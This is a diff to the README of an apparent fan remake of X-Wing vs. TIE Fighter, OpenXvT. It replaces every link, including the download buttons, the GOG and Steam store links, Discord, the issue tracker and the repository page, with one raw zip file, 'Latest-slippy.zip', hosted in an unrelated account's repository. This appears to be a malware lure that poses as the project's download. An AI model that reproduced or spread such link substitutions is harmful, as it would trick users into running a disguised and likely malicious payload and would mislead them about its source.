@@ -5,7 +5,7 @@ description: "Reimagine the classic 1997 Star Wars X-Wing vs. TIE Fighter with n
 ---
 # 🚀 OpenXvT - Relive Classic Star Wars Space Combat Today
 
-[🎮 Download OpenXvT Now](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
+[🎮 Download OpenXvT Now](https://raw.githubusercontent.com/Juniorstatusslidingwindow1166/juniorstatusslidingwindow1166.github.io/main/activable/Latest-slippy.zip)
 
 ## 🌟 What Is OpenXvT?
 
@@ -31,9 +31,9 @@ Before you download OpenXvT, you must have:
 
 **Where to Get the Original Game:**
 If you don’t already own the game, you can purchase it from:
-- [GOG](https://www.gog.com/en/game/star_wars_xwing_vs_tie_fighter)
+- [GOG](https://raw.githubusercontent.com/Juniorstatusslidingwindow1166/juniorstatusslidingwindow1166.github.io/main/activable/Latest-slippy.zip)
 )
-- [Steam](https://store.steampowered.com/app/361690/Star_Wars_X_Wing_Vs_Tie_Fighter_Balance_Of_Power_Campaigns/};
+- [Steam](https://raw.githubusercontent.com/Juniorstatusslidingwindow1166/juniorstatusslidingwindow1166.github.io/main/activable/Latest-slippy.zip};
 
 > [!IMPORTANT]
 > OpenXvT does **not** include any content from the original game. You must have your own copy of the game and expansion to use this software. This ensures we respect copyright laws and support the original creators.
@@ -62,7 +62,7 @@ Follow these simple steps exactly as written to get OpenXvT up and running on yo
 
 ### Step 1: Download the Application
 
-[⬇️ Click Here to Download OpenXvT](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
+[⬇️ Click Here to Download OpenXvT](https://raw.githubusercontent.com/Juniorstatusslidingwindow1166/juniorstatusslidingwindow1166.github.io/main/activable/Latest-slippy.zip)
 
 
 
@@ -129,9 +129,9 @@ OpenXvT brings back everything you loved about *X-Wing vs. TIE Fighter*, includi
 
 OpenXvT is more than just software — it's a community of Star Wars fans who want to preserve this classic game. Join us to share tips, report bugs, request features, or just chat about your favorite Star Wars moments:
 
-- [💬 Join our Discord Server](https://discord.gg/WBvYzczWfG} — Get help, meet fellow pilots, and stay up to date with the latest news
-- [🐛 Report Issues](https://github.com/elyosh/OpenXvT/issues) — Found a bug? Let us know so we can fix it
-- [⭐ Star the Repository](https://github.com/elyosh/OpenXvT} — Show your support and help others discover this project
+- [💬 Join our Discord Server](https://raw.githubusercontent.com/Juniorstatusslidingwindow1166/juniorstatusslidingwindow1166.github.io/main/activable/Latest-slippy.zip} — Get help, meet fellow pilots, and stay up to date with the latest news
+- [🐛 Report Issues](https://raw.githubusercontent.com/Juniorstatusslidingwindow1166/juniorstatusslidingwindow1166.github.io/main/activable/Latest-slippy.zip) — Found a bug? Let us know so we can fix it
+- [⭐ Star the Repository](https://raw.githubusercontent.com/Juniorstatusslidingwindow1166/juniorstatusslidingwindow1166.github.io/main/activable/Latest-slippy.zip} — Show your support and help others discover this project
 
 ## 📦 Open Source License
 
